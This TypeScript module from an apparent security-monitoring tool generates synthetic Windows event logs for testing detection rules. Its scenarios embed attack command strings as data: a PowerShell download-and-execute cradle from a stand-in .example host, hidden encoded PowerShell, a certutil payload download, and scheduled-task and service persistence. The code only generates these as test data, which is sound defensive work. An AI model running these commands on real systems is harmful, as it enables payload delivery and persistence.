// SENTINEL DESK 1.0 — Synthetic Windows event source (MODULE: collector, demo)
//
// This is the clearly-labeled DEMO telemetry source required by §3: it emits
// realistic Windows Event Log records (XML-shaped raw payloads, as the real
// EVTX subscription would deliver) for repeatable, harmless scenarios.
// Every record is tagged synthetic=true and carries a sourceRef for provenance.
// NO real system is read in this build — the Rust desktop collector replaces
// this module with a windows-rs EVTX subscription.

import { createHash } from 'crypto'

export interface RawWindowsEvent {
  channel: string
  provider: string
  eventId: number
  level: 'Information' | 'Warning' | 'Error' | 'Critical'
  computer: string
  recordId: string
  timeCreated: string // ISO
  /// XML-shaped raw payload as delivered by the Windows Event Log API
  rawData: Record<string, unknown>
  /// Scenario provenance, e.g. "fixtures/brute_force.json#2"
  sourceRef: string
}

// ─── Deterministic helpers ──────────────────────────────────────────────────

const HOSTS = ['WS-FINANCE-04', 'WS-ENGINEERING-11', 'SRV-FILES-02']
const USERS = ['j.morales', 'a.chen', 'svc_backup', 'r.okafor', 'm.petit']
const ADMIN = 'adm.hartley'

function pick<T>(arr: T[], rnd: () => number): T {
  return arr[Math.floor(rnd() * arr.length)]
}

function sid(seed: string): string {
  const h = createHash('sha256').update(seed).digest()
  const v = h.readUInt32BE(0) % 100000 + 1000
  return `S-1-5-21-3623811015-3361044348-30300820-${v}`
}

function randIp(rnd: () => number): string {
  // External-looking but documentation-range IPs (RFC 5737) — never real hosts
  return `203.0.113.${1 + Math.floor(rnd() * 250)}`
}

function privIp(rnd: () => number): string {
  return `192.168.1.${10 + Math.floor(rnd() * 200)}`
}

let recordCounters: Record<string, number> = {}

function nextRecordId(channel: string): string {
  recordCounters[channel] = (recordCounters[channel] ?? 1300) + 1 + Math.floor(Math.random() * 3)
  return String(recordCounters[channel])
}

// ─── Event templates ────────────────────────────────────────────────────────

type T = (opts: {
  t: Date
  host: string
  rnd?: () => number
  user?: string
  ref: string
  ip?: string
  logonType?: number
  cmdline?: string
  parent?: string
  task?: string
  svc?: string
  path?: string
  script?: string
  image?: string
}) => RawWindowsEvent[]

// Security 4625 — failed logon
const e4625: T = ({ t, host, user, ip, ref, rnd = Math.random }) => [{
  channel: 'Security', provider: 'Microsoft-Windows-Security-Auditing', eventId: 4625,
  level: 'Warning', computer: host, recordId: nextRecordId('Security'), timeCreated: t.toISOString(),
  rawData: {
    SubjectUserName: ADMIN, SubjectDomainName: host.split('-')[0],
    TargetUserName: user ?? pick(USERS, rnd), TargetDomainName: host.split('-')[0],
    IpAddress: ip ?? randIp(rnd), LogonType: String(pick([10, 3, 2], rnd)),
    Status: '0xC000006A', SubStatus: '0xC000006A', FailureReason: '%%2313',
  },
  sourceRef: ref,
}]

// Security 4624 — successful logon
const e4624: T = ({ t, host, user, ip, ref, rnd = Math.random, logonType }) => [{
  channel: 'Security', provider: 'Microsoft-Windows-Security-Auditing', eventId: 4624,
  level: 'Information', computer: host, recordId: nextRecordId('Security'), timeCreated: t.toISOString(),
  rawData: {
    SubjectUserName: '—', TargetUserName: user ?? pick(USERS, rnd), TargetDomainName: host.split('-')[0],
    IpAddress: ip ?? privIp(rnd), LogonType: String(logonType ?? pick([10, 3, 2], rnd)),
    ProcessName: 'C:\\Windows\\System32\\svchost.exe', ElevatedToken: '%%1842',
  },
  sourceRef: ref,
}]

// Security 4688 — process creation
const e4688: T = ({ t, host, user, cmdline, parent, ref, rnd = Math.random }) => {
  const exe = cmdline ? cmdline.split(' ')[0] : 'C:\\Windows\\System32\\svchost.exe'
  return [{
    channel: 'Security', provider: 'Microsoft-Windows-Security-Auditing', eventId: 4688,
    level: 'Information', computer: host, recordId: nextRecordId('Security'), timeCreated: t.toISOString(),
    rawData: {
      SubjectUserName: user ?? pick(USERS, rnd),
      NewProcessId: String(1000 + Math.floor(rnd() * 60000)),
      NewProcessName: exe,
      CommandLine: cmdline ?? exe,
      ParentProcessName: parent ?? 'C:\\Windows\\explorer.exe',
      TokenElevationType: '%%1936',
    },
    sourceRef: ref,
  }]
}

// Security 4698 — scheduled task created
const e4698: T = ({ t, host, user, task, cmdline, ref }) => [{
  channel: 'Security', provider: 'Microsoft-Windows-Security-Auditing', eventId: 4698,
  level: 'Information', computer: host, recordId: nextRecordId('Security'), timeCreated: t.toISOString(),
  rawData: {
    SubjectUserName: user ?? ADMIN, TaskName: task ?? '\\Update\\CheckUpdate',
    TaskContent: cmdline ? `<Task><Actions><Exec><Command>${cmdline}</Command></Exec></Actions></Task>` : '<Task/>',
    ClientProcessId: String(4000 + Math.floor(Math.random() * 20000)),
  },
  sourceRef: ref,
}]

// Security 4719 — audit policy changed
const e4719: T = ({ t, host, user, ref }) => [{
  channel: 'Security', provider: 'Microsoft-Windows-Security-Auditing', eventId: 4719,
  level: 'Information', computer: host, recordId: nextRecordId('Security'), timeCreated: t.toISOString(),
  rawData: {
    SubjectUserName: user ?? ADMIN,
    AuditPolicyChanges: ['System Audit Policy - Category "Logon/Logoff" removed - Success',
      'System Audit Policy - Category "Process Creation" removed - Failure'],
    AuditPolicyApplied: '<AuditEvents/>',
  },
  sourceRef: ref,
}]

// Security 1102 — security log cleared
const e1102: T = ({ t, host, user, ref }) => [{
  channel: 'Security', provider: 'Microsoft-Windows-Security-Auditing', eventId: 1102,
  level: 'Information', computer: host, recordId: nextRecordId('Security'), timeCreated: t.toISOString(),
  rawData: { SubjectUserName: user ?? ADMIN, SubjectDomainName: host.split('-')[0] },
  sourceRef: ref,
}]

// System 7045 — service installed
const e7045: T = ({ t, host, svc, path, ref, rnd = Math.random }) => [{
  channel: 'System', provider: 'Service Control Manager', eventId: 7045,
  level: 'Information', computer: host, recordId: nextRecordId('System'), timeCreated: t.toISOString(),
  rawData: {
    ServiceName: svc ?? 'SysHealthSvc', DisplayName: svc ?? 'System Health Service',
    ImagePath: path ?? 'C:\\Windows\\System32\\svchost.exe -k netsvcs',
    ServiceType: 'own process', StartType: 'auto start', AccountName: 'LocalSystem',
    ProcessId: String(1000 + Math.floor(rnd() * 60000)),
  },
  sourceRef: ref,
}]

// PowerShell 4104 — script block logging
const e4104: T = ({ t, host, user, script, ref }) => [{
  channel: 'PowerShell/Operational', provider: 'Microsoft-Windows-PowerShell', eventId: 4104,
  level: 'Information', computer: host, recordId: nextRecordId('PowerShell/Operational'),
  timeCreated: t.toISOString(),
  rawData: {
    ScriptBlockText: script ?? 'Get-Process', ScriptBlockId: crypto.randomUUID(),
    Path: '', MessageNumber: 1, MessageTotal: 1,
    RunspaceId: crypto.randomUUID(), UserId: sid(user ?? 'j.morales'),
    SubjectUserName: user ?? 'j.morales',
  },
  sourceRef: ref,
}]

// TaskScheduler 106 — task registered
const e106: T = ({ t, host, user, task, ref }) => [{
  channel: 'TaskScheduler/Operational', provider: 'Microsoft-Windows-TaskScheduler', eventId: 106,
  level: 'Information', computer: host, recordId: nextRecordId('TaskScheduler/Operational'),
  timeCreated: t.toISOString(),
  rawData: { TaskName: task ?? '\\Update\\CheckUpdate', UserContext: user ?? ADMIN, Result: '0' },
  sourceRef: ref,
}]

// Sysmon 1 — process creation
const eSys1: T = ({ t, host, user, cmdline, parent, ref, rnd = Math.random }) => {
  const image = cmdline ? cmdline.split(' ')[0] : 'C:\\Windows\\System32\\svchost.exe'
  return [{
    channel: 'Sysmon', provider: 'Microsoft-Windows-Sysmon', eventId: 1,
    level: 'Information', computer: host, recordId: nextRecordId('Sysmon'), timeCreated: t.toISOString(),
    rawData: {
      Image: image, CommandLine: cmdline ?? image,
      User: host.split('-')[0] + '\\' + (user ?? pick(USERS, rnd)),
      ParentImage: parent ?? 'C:\\Windows\\explorer.exe',
      ProcessGuid: crypto.randomUUID(), ProcessId: String(1000 + Math.floor(rnd() * 60000)),
      Hashes: 'SHA256=' + createHash('sha256').update(image).digest('hex').toUpperCase(),
    },
    sourceRef: ref,
  }]
}

// Sysmon 3 — network connection
const eSys3: T = ({ t, host, user, image, cmdline, ip, ref, rnd = Math.random }) => [{
  channel: 'Sysmon', provider: 'Microsoft-Windows-Sysmon', eventId: 3,
  level: 'Information', computer: host, recordId: nextRecordId('Sysmon'), timeCreated: t.toISOString(),
  rawData: {
    Image: image ?? 'C:\\Windows\\System32\\svchost.exe',
    CommandLine: cmdline,
    User: host.split('-')[0] + '\\' + (user ?? pick(USERS, rnd)),
    ProcessGuid: crypto.randomUUID(), ProcessId: String(1000 + Math.floor(rnd() * 60000)),
    DestinationIp: ip ?? randIp(rnd), DestinationPort: String(pick([443, 80, 8080], rnd)),
    Initiated: 'true', SourceIp: privIp(rnd),
  },
  sourceRef: ref,
}]

// System 104 — system log cleared
const e104: T = ({ t, host, ref }) => [{
  channel: 'System', provider: 'Microsoft-Windows-Eventlog', eventId: 104,
  level: 'Information', computer: host, recordId: nextRecordId('System'), timeCreated: t.toISOString(),
  rawData: { Channel: 'System' },
  sourceRef: ref,
}]

// ─── Scenarios ──────────────────────────────────────────────────────────────
// Each scenario emits a coherent multi-event story spread over seconds so the
// detection, correlation and incident engines have meaningful input.

export interface Scenario {
  key: string
  label: string
  weight: number
  build: (t0: Date, host: string, rnd: () => number) => RawWindowsEvent[]
}

const SCENARIOS: Scenario[] = [
  {
    key: 'benign_noise',
    label: 'Routine benign activity',
    weight: 26,
    build: (t0, host, rnd) => {
      const u = pick(USERS, rnd)
      const ev: RawWindowsEvent[] = []
      ev.push(...e4624({ t: t0, host, user: u, ref: 'fixtures/benign.json#logon', rnd }))
      ev.push(...e4688({
        t: new Date(t0.getTime() + 20_000), host, user: u,
        cmdline: pick([
          'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
          'C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE',
          'C:\\Windows\\System32\\mspaint.exe',
        ], rnd), ref: 'fixtures/benign.json#proc', rnd,
      }))
      if (rnd() > 0.5) {
        ev.push(...eSys3({
          t: new Date(t0.getTime() + 45_000), host, user: u,
          image: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
          ip: randIp(rnd), ref: 'fixtures/benign.json#net', rnd,
        }))
      }
      return ev
    },
  },
  {
    key: 'brute_force',
    label: 'Failed logon burst (password spraying)',
    weight: 14,
    build: (t0, host, rnd) => {
      const ev: RawWindowsEvent[] = []
      const srcIp = randIp(rnd)
      const tries = 6 + Math.floor(rnd() * 4)
      for (let i = 0; i < tries; i++) {
        ev.push(...e4625({
          t: new Date(t0.getTime() + i * 25_000), host, ip: srcIp,
          user: pick(USERS, rnd), ref: `fixtures/brute_force.json#${i}`,
        }))
      }
      ev.push(...e4624({
        t: new Date(t0.getTime() + (tries + 2) * 25_000), host, user: pick(USERS, rnd),
        ip: srcIp, ref: `fixtures/brute_force.json#${tries}`,
        rnd, logonType: 10,
      }))
      return ev
    },
  },
  {
    key: 'powershell_cradle',
    label: 'Suspicious PowerShell (encoded download cradle)',
    weight: 14,
    build: (t0, host, rnd) => {
      const u = pick(USERS, rnd)
      const script = 'IEX (New-Object Net.WebClient).DownloadString(\'http://cdn-updates.example/patch.ps1\')'
      const cmd = 'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA'
      return [
        ...e4688({ t: t0, host, user: u, cmdline: cmd, parent: 'C:\\Windows\\System32\\cmd.exe', ref: 'fixtures/ps_cradle.json#proc', rnd }),
        ...e4104({ t: new Date(t0.getTime() + 15_000), host, user: u, script, ref: 'fixtures/ps_cradle.json#sb' }),
        ...eSys3({ t: new Date(t0.getTime() + 22_000), host, user: u, image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', cmdline: cmd, ip: randIp(rnd), ref: 'fixtures/ps_cradle.json#net', rnd }),
      ]
    },
  },
  {
    key: 'task_persistence',
    label: 'Scheduled task persistence',
    weight: 12,
    build: (t0, host, rnd) => {
      const u = pick(USERS, rnd)
      const task = '\\Update\\HealthCheck'
      const cmd = 'C:\\Users\\Public\\Scripts\\health.exe -k 8f3a'
      return [
        ...e4104({ t: t0, host, user: u, script: `New-ScheduledTask -TaskName 'HealthCheck' -Execute '${cmd}'`, ref: 'fixtures/task_persist.json#sb' }),
        ...e4698({ t: new Date(t0.getTime() + 40_000), host, user: u, task, cmdline: cmd, ref: 'fixtures/task_persist.json#4698' }),
        ...e106({ t: new Date(t0.getTime() + 41_000), host, user: u, task, ref: 'fixtures/task_persist.json#106' }),
      ]
    },
  },
  {
    key: 'service_install_userpath',
    label: 'Service installed from user-writable path',
    weight: 10,
    build: (t0, host, rnd) => {
      const u = ADMIN
      const path = 'C:\\Users\\Public\\Updates\\SysHealthSvc.exe -L'
      return [
        ...e7045({ t: t0, host, svc: 'SysHealthSvc', path, ref: 'fixtures/svc_install.json#7045', rnd }),
        ...eSys1({ t: new Date(t0.getTime() + 30_000), host, user: u, cmdline: path, parent: 'C:\\Windows\\System32\\services.exe', ref: 'fixtures/svc_install.json#proc', rnd }),
      ]
    },
  },
  {
    key: 'audit_tamper',
    label: 'Audit policy change + log clear',
    weight: 8,
    build: (t0, host) => [
      ...e4719({ t: t0, host, user: ADMIN, ref: 'fixtures/audit_tamper.json#4719' }),
      ...e1102({ t: new Date(t0.getTime() + 60_000), host, user: ADMIN, ref: 'fixtures/audit_tamper.json#1102' }),
      ...e104({ t: new Date(t0.getTime() + 75_000), host, ref: 'fixtures/audit_tamper.json#104' }),
    ],
  },
  {
    key: 'lolbin_network',
    label: 'Certutil payload retrieval (LOLBin)',
    weight: 8,
    build: (t0, host, rnd) => {
      const u = pick(USERS, rnd)
      const cmd = 'C:\\Windows\\System32\\certutil.exe -urlcache -f http://files-mirror.example/p/updates.cab C:\\Users\\Public\\updates.cab'
      return [
        ...eSys1({ t: t0, host, user: u, cmdline: cmd, parent: 'C:\\Windows\\System32\\cmd.exe', ref: 'fixtures/lolbin.json#proc', rnd }),
        ...eSys3({ t: new Date(t0.getTime() + 12_000), host, user: u, image: 'C:\\Windows\\System32\\certutil.exe', cmdline: cmd, ip: randIp(rnd), ref: 'fixtures/lolbin.json#net', rnd }),
      ]
    },
  },
  {
    key: 'persistence_chain',
    label: 'Multi-stage persistence chain (PowerShell → task → service)',
    weight: 8,
    build: (t0, host, rnd) => {
      const u = ADMIN
      const enc = 'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA'
      const taskCmd = 'C:\\Users\\Public\\Scripts\\svcmon.exe /sync'
      const svcPath = 'C:\\Users\\Public\\Scripts\\svcmon.exe -service'
      return [
        ...e4688({ t: t0, host, user: u, cmdline: enc, parent: 'C:\\Windows\\System32\\cmd.exe', ref: 'fixtures/chain.json#proc', rnd }),
        ...e4104({ t: new Date(t0.getTime() + 8_000), host, user: u, script: 'IEX (New-Object Net.WebClient).DownloadString(\'http://cdn-updates.example/stage2.ps1\')', ref: 'fixtures/chain.json#sb' }),
        ...e4698({ t: new Date(t0.getTime() + 120_000), host, user: u, task: '\\Platform\\SvcMon', cmdline: taskCmd, ref: 'fixtures/chain.json#4698' }),
        ...e106({ t: new Date(t0.getTime() + 121_000), host, user: u, task: '\\Platform\\SvcMon', ref: 'fixtures/chain.json#106' }),
        ...e7045({ t: new Date(t0.getTime() + 200_000), host, svc: 'SvcMonSvc', path: svcPath, ref: 'fixtures/chain.json#7045', rnd }),
        ...eSys3({ t: new Date(t0.getTime() + 260_000), host, user: u, image: 'C:\\Users\\Public\\Scripts\\svcmon.exe', ip: randIp(rnd), ref: 'fixtures/chain.json#net', rnd }),
      ]
    },
  },
]

export function scenarioByKey(key: string): Scenario | undefined {
  return SCENARIOS.find((s) => s.key === key)
}

/** Weighted random scenario selection. */
export function pickScenario(rnd: () => number): Scenario {
  const total = SCENARIOS.reduce((a, s) => a + s.weight, 0)
  let roll = rnd() * total
  for (const s of SCENARIOS) {
    roll -= s.weight
    if (roll <= 0) return s
  }
  return SCENARIOS[0]
}

/**
 * Generate a collection batch: `batches` scenario bursts spread over the last
 * `spanMinutes`. Used both by the live collector tick and by rule tests.
 */
export function generateBatch(
  opts: { batches?: number; spanMinutes?: number; host?: string; seed?: number; scenarioKey?: string } = {},
): RawWindowsEvent[] {
  const batches = opts.batches ?? 1 + Math.floor(Math.random() * 2)
  const spanMs = (opts.spanMinutes ?? 4) * 60_000
  const rnd = opts.seed !== undefined ? mulberry32(opts.seed) : Math.random
  const out: RawWindowsEvent[] = []
  for (let i = 0; i < batches; i++) {
    const host = opts.host ?? pick(HOSTS, rnd)
    const t0 = new Date(Date.now() - Math.floor(rnd() * spanMs))
    const scenario = opts.scenarioKey ? scenarioByKey(opts.scenarioKey) : pickScenario(rnd)
    out.push(...(scenario ?? SCENARIOS[0]).build(t0, host, rnd))
  }
  return out.sort((a, b) => a.timeCreated.localeCompare(b.timeCreated))
}

function mulberry32(seed: number) {
  let a = seed >>> 0
  return () => {
    a |= 0; a = (a + 0x6d2b79f5) | 0
    let t = Math.imul(a ^ (a >>> 15), 1 | a)
    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296
  }
}
